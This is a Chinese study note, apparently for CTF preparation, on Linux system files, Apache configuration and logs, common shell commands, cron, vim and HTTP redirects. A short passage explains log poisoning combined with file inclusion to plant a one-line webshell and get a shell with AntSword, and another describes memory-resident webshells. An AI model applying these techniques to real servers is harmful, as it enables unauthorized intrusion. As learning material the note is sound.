title="&#x2F;etc&#x2F;rc.d"></a>&#x2F;etc&#x2F;rc.d</h6><p><strong>进程</strong></p><p>要弄懂这个文件首先要知道操作系统中进程的意思</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> #狭义定义：</span><br><span class="line"> 进程是正在运行的程序的实例（an instance of a computer program that is being executed）。</span><br><span class="line"> #广义定义：</span><br><span class="line"> 进程是一个具有一定独立功能的程序关于某个数据集合的一次运行活动。它是操作系统动态执行的基本单元，在传统的操作系统中，进程既是基本的分配单元，也是基本的执行单元。</span><br><span class="line"> #进程的概念主要有两点：</span><br><span class="line"> 第一，进程是一个实体。每一个进程都有它自己的地址空间，一般情况下，包括文本区域（text region）、数据区域（data region）和堆栈（stack region）。文本区域存储处理器执行的代码；数据区域存储变量和进程执行期间使用的动态分配的内存；堆栈区域存储着活动过程调用的指令和本地变量。</span><br><span class="line"> ​</span><br><span class="line"> 第二，进程是一个“执行中的程序”。程序是一个没有生命的实体，只有处理器赋予程序生命时（操作系统执行之），它才能成为一个活动的实体，我们称其为进程。 </span><br><span class="line"> 进程是操作系统中最基本、重要的概念。是多道程序系统出现后，为了刻画系统内部出现的动态情况，描述系统内部各道程序的活动规律引进的一个概念,所有多道程序设计操作系统都建立在进程的基础上。</span><br></pre></td></tr></table></figure><p><strong>内容</strong></p><p>rc.d的内容如下: init.d&#x2F; :各种服务器和程序的二进制文件存放目录。 rc[x].d&#x2F;: 各个<strong>启动级别</strong>的执行程序连接目录。里头的东西都是指向init.d&#x2F;的一些软连接。具体的后边叙述。 还有三个脚本:rc.sysinit, rc, rc.local</p><p><strong>CentOS目录</strong>（注意kali和centos目录结构略有不同，网上大多是centos的目录结构）</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026221707080-1024x373.png" style="zoom:50%;" /><p><strong>运行级别(run level)</strong></p><p>Init进程是系统启动之后的第一个用户进程，所以它的pid(进程编号)始终为1。init进程上来首先做的事是去读取&#x2F;etc&#x2F;目录下inittab文件中initdefault id值，这个值称为运行级别(run-level)。它决定了系统启动之后运行于什么级别。运行级别决定了系统启动的绝大部分行为和目的。这个级别从0到6 ，具有不同的功能。不同的运行级定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 0 - 停机（千万别把initdefault设置为0，否则系统永远无法启动）</span><br><span class="line"> 1 - 单用户模式</span><br><span class="line"> 2 - 多用户，没有 NFS</span><br><span class="line"> 3 - 完全多用户模式(标准的运行级)</span><br><span class="line"> 4 – 系统保留的</span><br><span class="line"> 5 - X11 （x window)</span><br><span class="line"> 6 - 重新启动 （千万不要把initdefault 设置为6，否则将一直在重启 ）</span><br></pre></td></tr></table></figure><p>rc.d包含许多系统服务的启动和停止<strong>脚本</strong>。它控制着所有从 acpid 到 x11-common 的各种事务。</p><h6 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="&#x2F;etc&#x2F;init.d"></a>&#x2F;etc&#x2F;init.d</h6><p>目录 <code>/etc/init.d</code> 是<strong>符号链接文件</strong>，实际上是链接到目录 <strong>&#x2F;etc&#x2F;rc.d&#x2F;init.d</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222100823-1024x72.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20210521100903155.jpg"></p><p>(kali系统下)init.d中的脚本文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> init.d里面放的都是什么东西?这个目录存放的是一些脚本，一般是linux以rpm包安装时设定的一些服务的启动脚本。系统在安装时装了好多rpm包，这里面就有很多对应的脚本。执行这些脚本可以用来启动，停止，重启这些服务。</span><br><span class="line"> 前面说到，/etc/rc.d/init.d这个目录下的脚本就类似与windows中的注册表，在系统启动的时候执行。程序运行到这里(init进程读取了运行级别)，相信从命名的角度大家也能猜到该运行/etc/rc.d/init.d里面的脚本了，不然它为什么也叫init(.d)呢是吧。没错，是该运行init.d里的脚本了，但是并不是直接运行，而是有选择的因为系统并不需要启动所有的服务。</span><br><span class="line">     那么，系统是如何选择哪些需要启动哪些不要呢？这时刚才说的运行级别就起作用了。</span><br><span class="line">     在决定了系统启动的run level之后，/etc/rc.d/rc这个脚本先执行。在RH9和FC7的源码中它都是一上来就check_runlevel()（虽然实现的代码不一样，也大同小异），知道了运行级别之后，对于每一个运行级别，在rc.d下都有一个子目录分别是rc0.d，rc1.d ….. rc6.d。每个目录下都是到init.d目录的一部分脚本一些链接。每个级别要执行哪些服务就在相对应的目录下，比如级别5要启动的服务就都放在rc5.d下，但是放在这个rc5.d下的都是一些链接文件，链接到init.d中相对应的文件，真正干活的init.d里的脚本。</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210635328-1024x410.png" style="zoom: 67%;" /><p><strong>放马</strong></p><p>这个文件关于计划任务，这中间就存在一定的放马攻击。</p><p><strong>内存马的3大特点</strong> 内存马的概念特性，除了隐蔽性、不易被察觉以外，其还有如下几个特点：1、内存马无逻辑结构边界，难以被发现。内存马仅存在于进程的内存空间中，通常与正常的&#x2F;合法的代码、数据混淆。内存马与传统恶意代码的不同之处在于它没有磁盘文件，会导致传统的检测防护手段失效。2、内存马缺乏稳定的静态特征，难以被识别。内存马缺乏结构化的静态形式，它依附在进程运行期间的输入数据进入进程，数据可能被加密混淆，因此，无法通过特征识别内存马。3、 内存马种类多，检测机制复杂而多样。内存马有二进制代码片段（Shellcode）、PowerShell脚本、Web中间件等类型，每种类型又可细分，不同类型内存马的执行方式、恶意代码&#x2F;行为触发机制各不相同。</p><h6 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="&#x2F;etc&#x2F;shadow"></a>&#x2F;etc&#x2F;shadow</h6><p>用于存储 Linux 系统中用户的密码信息,被称为’影子文件‘</p><p>在安装了影子口令软件的系统上的影子口令文件.影子口令文件将&#x2F;etc&#x2F;passwd 文件中的加密口令移动到&#x2F;etc&#x2F;shadow中，而后者只对root可读.这使破译口令更困难.</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222757599-1024x83.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 每个字段含义：</span><br><span class="line"> 用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure><p>对于<strong>加密密码</strong>：</p><p>这里保存的是真正加密的密码。目前 Linux 的密码采用的是 <strong>SHA512</strong> 散列加密算法，原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。</p><h6 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="&#x2F;etc&#x2F;hosts"></a>&#x2F;etc&#x2F;hosts</h6><p>hosts文件是linux系统中负责<strong>ip地址与域名快速解析</strong>的文件（和Windows是一样的捏）</p><p>hosts文件包含了ip地址和主机名之间的映射，包括主机名的别名，在没有域名服务器的情况下，系统上的所有网络程序都通过查询该文件来解析对应于某个主机名的ip地址，否则就需要使用DNS服务程序来解决。通常可以将常用的域名和ip地址映射加入到hosts文件中，实现快速方便的访问 优先级：dns缓存&gt;hosts&gt;dns服务</p><p><strong>格式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ip地址 主机名/域名 （主机别名）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225531886-1024x80.png"></p><h4 id="web服务器重要文件"><a href="#web服务器重要文件" class="headerlink" title="web服务器重要文件"></a>web服务器重要文件</h4><h6 id="apache"><a href="#apache" class="headerlink" title="apache"></a><strong>apache</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apache2</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192501209-1024x398.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apcche2/apache2.conf  -&gt;配置文件</span><br></pre></td></tr></table></figure><p>apache2.conf是个主配置文件，当apache2服务器启动时，就将零散的配置文件以Including方式组合在一起。看到这，你就应该知道了，这个文件不是真正的具体配置文件，它只是把各个零散的配置文件以inluceding方式包含进来。apache2.conf其实就是负责调用其他配置文件的。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192850010.png" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apche2/ports.conf  -&gt;端口配置</span><br></pre></td></tr></table></figure><p>ports.cnf记录了服务器使用的端口号，默认监听Listen80，建立自己的网站需要在这里添加网站的端口号，否则无法访问。</p><p>&lt;IfModule ssl_module&gt; Listen 443 </IfModule> 表示当ssl_module启动时，进行443端口的监听。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193104696-1024x429.png" style="zoom:50%;" /><p>sites-enabled是apache2<strong>正在使用的网站配置文件</strong>，sites-available是apache2<strong>可用的网站配置文件</strong>。</p><p>enabled中只有一个000-default.conf快捷方式。availbel中有一个000-default.conf和default-ssl.conf两个文件。</p><p>000-default.conf是<strong>使用http协议网站的默认网站配置文件</strong>，而default-ss.conf是<strong>https协议网站才使用的默认网站配置文件</strong>。https还需要申请ssl证书。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193634755-1024x172.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/etc/apache2/sites-available/000-default.conf  -&gt;使用http协议网站的默认网站配置文件</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193903339-1024x493.png" style="zoom:50%;" /><p><strong>ServerAdmin</strong>： 设置一个邮件地址，如果服务器有任何问题将发信到这个地址， 这个地址会在服务器产生的某些页面中出现。</p><p><strong>DocumentRoot</strong> 是这个站点的根目录，这样 Apache2 启动时会扫描 &#x2F;etc&#x2F;apache2&#x2F;sites-enabled 中可用的 website 配置并加载。</p><p>当用户访问localhost:80 时，Apache2 就将 default 站点根目录 &#x2F;var&#x2F;www&#x2F;html 下的index.html（或 index.PHP 等，可配置）作为请求的回应返回给浏览器，然后你能欣赏到的就是 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html 这个文件的内容了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> #/var/www/html   -&gt;  网站根目录</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200644069-1024x155.png" style="zoom:50%;" /><p>例如，&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200821690-1024x406.png" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> # /var/log/apache2  -》日志文件</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027201546949-1024x290.png" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1-1024x173.png" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1024x173.png" style="zoom:67%;" /><p><strong>ip 时间 请求方式&#x2F;请求资源 协议状态码 服务器向客户端发送的字节数 记录从哪个页面链接访问来的（非页面访问则为-） 客户浏览器信息（UA） （请求代理字符串）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202105222-1024x98.png"></p><p>日志注入(狭义)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> #中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息</span><br><span class="line"> #如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候,日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell</span><br><span class="line"> #比如使用代理工具抓包,在HTTP请求中插入一句话木马,访问日志文件时会执行一句话木马,然后使用蚁剑等工具链接,从而getshell（结合文件包含漏洞）</span><br><span class="line"> url：https://blog.csdn.net/wangyuxiang946/article/details/119832592</span><br></pre></td></tr></table></figure><p>补充：<strong>日志文件</strong></p><p>推荐阅读：<a href="https://zhuanlan.zhihu.com/p/298335887">https://zhuanlan.zhihu.com/p/298335887</a></p><p><strong>作用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 日志文件用于记录linux系统的各种运行信息的文件，相当于linux主机的日记，不同的日志文件记载了不同类型的信息,如Linux内核消息、用户登录事件、程序错误等。. 日志文件对于诊断和解决问题很有帮助，因为linux运行的程序通常把系统的消息和错误写入对应的日志文件，这样系统可以有据可查， 此外,当主机遭受攻击时,日志文件还可以帮助寻找攻击者留下的痕迹。</span><br></pre></td></tr></table></figure><p><strong>Linux系统本身和大部分服务器程序的日志文件默认放在&#x2F;var&#x2F;log&#x2F;下</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/v2-a298559e05d7b6be063b84717f6db6f1_1440w.webp" style="zoom: 67%;" /><p><strong>用户日志：</strong></p><p>存放位置: &#x2F;var&#x2F;og&#x2F;wtmp. &#x2F;var&#x2F;log&#x2F;btmp、 &#x2F;var&#x2F;log&#x2F;lastlog</p><p><strong>查询命令: users、who、w、last、 lastlog、 lastb等</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> users命令:只是简单的输出当前登录的用户名, 每个显示的用户名对应一个会话。</span><br><span class="line"> who命令:报告当前登录到系统的每个用户的信息，包括用户名，终端，登录日期，远程主机</span><br><span class="line"> w命令： 显示当前操作系统的每个用户及其远程所运行的进程信息</span><br><span class="line"> last命令:用于查询成功登录到系统的用户记录,最近的登录情况在最前面。 通过last命令可以及时掌握Linux主机的登录情况,若发现未经授权的用户登陆过,则表示当前主机可能已被入侵。 </span><br><span class="line"> &#123;</span><br><span class="line"> -a  :把从何处登录系统的主机名称或IP地址,显示在最后一行 </span><br><span class="line"> -d :将IP地址转换成主机名称 </span><br><span class="line"> -f 记录文件</span><br><span class="line"> ] :指定记录文件 </span><br><span class="line"> -R  :不显示登入系统的主机名称或IP地址 </span><br><span class="line"> -x :显示系统关闭,重新开机,以及执行等级的改变等 </span><br><span class="line"> -n : n代表数字,表示最近n次登录的记录</span><br><span class="line"> &#125;</span><br><span class="line"> lastlog命令:用于显示系统中所有用户最近一次登录信息</span><br><span class="line"> lastb命令:用于显显用户错误的登录列表,此指令可以发现系统的登录异常。如登录的用户名错误,密码不正确等情况都会记录在案,登录失败的情况属于安全事件,因此消失可能有人在尝试破解密码。除了使用lastb命令以外,可以直接从安全日志文件/var/log/secure中获得相关信息。</span><br></pre></td></tr></table></figure><p>windows系统下的apache日志目录</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027203802404-1024x713.png" style="zoom:50%;" /><h6 id="nginx（dd）"><a href="#nginx（dd）" class="headerlink" title="nginx（dd）"></a>nginx（dd）</h6><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h5 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ls:列出目录   &#123;ls -l  -》 ll&#125;</span><br><span class="line"> cd：切换目录   </span><br><span class="line"> pwd：显示当前目录</span><br><span class="line"> mkdir：创建一个新的目录</span><br><span class="line"> rmdir：删除一个空的目录</span><br><span class="line"> cp：复制文件或目录</span><br><span class="line"> rm：移除文件或目录</span><br></pre></td></tr></table></figure><h5 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> whoami</span><br></pre></td></tr></table></figure><h5 id="查看ip等信息"><a href="#查看ip等信息" class="headerlink" title="查看ip等信息"></a>查看ip等信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ifcinfig        //查询和配置网络接口</span><br><span class="line"> hostname -I  // 显示主机名ip</span><br><span class="line"> ip addr show  //查看ipv4，ipv6地址</span><br></pre></td></tr></table></figure><h5 id="显示当前位置路径"><a href="#显示当前位置路径" class="headerlink" title="显示当前位置路径"></a>显示当前位置路径</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   pwd                         //显示当前位置路径</span><br></pre></td></tr></table></figure><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> find . -name &quot;*.c&quot;     //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</span><br><span class="line"> find . -type f         //将目前目录其其下子目录中所有一般文件列出</span><br><span class="line"> find . -ctime -20      //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</span><br><span class="line"> find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;     //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</span><br><span class="line"> find . -type f -perm 644 -exec ls -l &#123;&#125; \;       //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</span><br><span class="line"> find / -type f -size 0 -exec ls -l &#123;&#125; \;         //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> 参数说明 :</span><br><span class="line"> #判断规则</span><br><span class="line"> find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。</span><br><span class="line"> #expression</span><br><span class="line"> expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。</span><br><span class="line"> -mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</span><br><span class="line"> -amin n : 在过去 n 分钟内被读取过</span><br><span class="line"> -anewer file : 比文件 file 更晚被读取过的文件</span><br><span class="line"> -atime n : 在过去 n 天内被读取过的文件</span><br><span class="line"> -cmin n : 在过去 n 分钟内被修改过</span><br><span class="line"> -cnewer file :比文件 file 更新的文件</span><br><span class="line"> -ctime n : 在过去 n 天内创建的文件</span><br><span class="line"> -mtime n : 在过去 n 天内修改过的文件</span><br><span class="line"> -empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</span><br><span class="line"> -ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</span><br><span class="line"> -name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</span><br><span class="line"> -size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</span><br><span class="line"> #关于文件类型</span><br><span class="line"> -type c : 文件类型是 c 的文件。</span><br><span class="line"> d: 目录</span><br><span class="line"> c: 字型装置文件</span><br><span class="line"> b: 区块装置文件</span><br><span class="line"> p: 具名贮列</span><br><span class="line"> f: 一般文件</span><br><span class="line"> l: 符号连结</span><br><span class="line"> s: socket</span><br><span class="line"> #pid</span><br><span class="line"> -pid n : process id 是 n 的文件</span><br><span class="line"> #分割运算符</span><br><span class="line"> 你可以使用 ( ) 将运算式分隔，并使用下列运算。</span><br><span class="line"> exp1 -and exp2</span><br><span class="line"> ! expr</span><br><span class="line"> -not expr</span><br><span class="line"> exp1 -or exp2</span><br><span class="line"> exp1, exp2</span><br></pre></td></tr></table></figure><h5 id="系统信息（-）"><a href="#系统信息（-）" class="headerlink" title="系统信息（*）"></a>系统信息（*）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> uname -a    //可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息</span><br><span class="line"> ps -ef         //查看所有正在运行的进程</span><br><span class="line"> ps -aux     //显示所有用户打开的进程,包括无控制终端的进程   其中有其他用户的command</span><br><span class="line"> ping IP        //查看与此IP地址的连接情况</span><br><span class="line"> netstat -an    //查看当前系统端口</span><br><span class="line"> netstat -an  grep 8080     //查看指定端口</span><br></pre></td></tr></table></figure><h5 id="解压缩命令"><a href="#解压缩命令" class="headerlink" title="解压缩命令"></a>解压缩命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> # 压缩文件 file1 或目录 dir2 到 test.tar.gz</span><br><span class="line"> tar -zcvf filename.tar.gz file1/dir2</span><br><span class="line"> # 解压 test.tar.gz（将 c 换成 x 即可）</span><br><span class="line"> tar -zxvf test.tar.gz</span><br><span class="line"> # 列出压缩文件的内容</span><br><span class="line"> tar -ztvf test.tar.gz </span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     -z -&gt; 使用 gzip 来压缩和解压文件</span><br><span class="line">     -v -&gt; --verbose 详细的列出处理的文件</span><br><span class="line">     -f -&gt; --file=ARCHIVE 使用档案文件或设备，这个选项通常是必选的</span><br><span class="line">     -c -&gt; --create 创建一个新的归档（压缩包）</span><br><span class="line">     -x -&gt; 从压缩包中解出文件</span><br></pre></td></tr></table></figure><h5 id="计划任务-dd"><a href="#计划任务-dd" class="headerlink" title="计划任务(dd)"></a>计划任务(dd)</h5><p><strong>计划任务主要分为以下两种使用情况:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 1.系统级别的定时任务： 临时文件清理、系统信息采集、日志文件切割</span><br><span class="line"> 2.用户级别的定时任务： 定时向互联网同步时间、定时备份系统配置文件、定时备份数据库的数据</span><br></pre></td></tr></table></figure><p><strong>crontab</strong>是Linux用来定期执行程序的命令。</p><p>crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> crond主要是做一些周期性的任务，比如: 凌晨3点定时备份数据。比如：11点开启网站抢购接口，12点关闭网站抢购接口。</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行</p><h5 id="vim编辑"><a href="#vim编辑" class="headerlink" title="vim编辑"></a>vim编辑</h5><p>基本上 vi&#x2F;vim 共分为三种模式，分别是<strong>命令模式（Command mode）</strong>，<strong>输入模式（Insert mode）</strong>和<strong>底线命令模式（Last line mode）</strong>。</p><p><strong>命令模式</strong></p><p>用户刚刚启动 vi&#x2F;vim，便进入了命令模式。此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。</p><p><strong>常见命令</strong></p><ul><li><strong>i</strong> 切换到输入模式，以输入字符。</li><li><strong>x</strong> 删除当前光标所在处的字符。</li><li><strong>:</strong> 切换到底线命令模式，以在最底一行输入命令。</li><li>若要编辑文本，进入命令模式后，按下i，切换到输入模式</li></ul><p><strong>输入模式</strong></p><ul><li><strong>字符按键以及Shift组合</strong>，输入字符</li><li><strong>ENTER</strong>，回车键，换行</li><li><strong>BACK SPACE</strong>，退格键，删除光标前一个字符</li><li><strong>ESC</strong>，退出输入模式，切换到命令模式</li></ul><p>编辑文本主要是现在这个模式，vim比vi升级很多，基本上编辑和一般的文本编辑差不多</p><p><strong>底线命令模式</strong></p><p>在命令模式下按下:（英文冒号）就进入了底线命令模式</p><p>常用命令（忽略冒号）</p><p><code>q</code> ：退出程序</p><p><code>w</code> ：保存文件</p><p>一般编辑过后直接 ：wq 然后回车</p><p>按<strong>ESC</strong>键可随时退出底线命令模式</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 重定向(Redirect)就是通过各种方法将各种网络请求重新定个方向转到其它位置（如：网页重定向、域名的重定向、路由选择的变化也是对数据报文经由路径的一种重定向）。</span><br></pre></td></tr></table></figure><h3 id="重定向-HTTP-状态码"><a href="#重定向-HTTP-状态码" class="headerlink" title="重定向 HTTP 状态码"></a><strong>重定向 HTTP 状态码</strong></h3><p>和重定向有关的 HTTP 状态码主要是 301、302、303、307、308，最常用的是 301 和 302，可以看看 MDN 官方对它们的解释。</p><p>301 是永久重定向（Moved Permanently）说明请求的资源已经被 <strong>永久</strong> 移动到了由 Location 头部指定的 url 上，是固定的不会再改变，搜索引擎会根据该响应修正。</p><p>而 302 是暂时性转移（Moved Temporarily，或者 Found），表明请求的资源被 <strong>暂时</strong> 移动到了由 Location 头部指定的 URL 上。浏览器会重定向到这个 URL， 但是搜索引擎不会对该资源的链接进行更新。</p><p>虽然 301 和 302 都能够将用户输入的网址 A， 改为重定向后的网址 B，但他们还是有区别的：</p><ul><li>搜索引擎区别：301 表示原地址 A 的资源已被移除，永远无法访问，搜索引擎抓内容时会将网址 A 全部替换为 B；而 302 表示网址 A 还活着，搜索引擎会在抓取网址 B 新内容的同时，保留网址 A 的记录。</li><li>安全性：302 跳转有网站劫持的风险，导致网站被盗用。</li></ul><p>在CTF中，重定向考点在于服务器对有flag的网页进行重定向而无法显示flag。</p><p>解决办法是使用curl命令（curl命令默认不强制重定向）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> #curl是一种命令行工具，作用是发出网络请求，然后得到和提取数据。</span><br><span class="line"> #我们直接在curl命令后加上网址，就可以看到网页源码。</span><br><span class="line"> $ curl www.baidu.com</span><br><span class="line">   % Total    % Received % 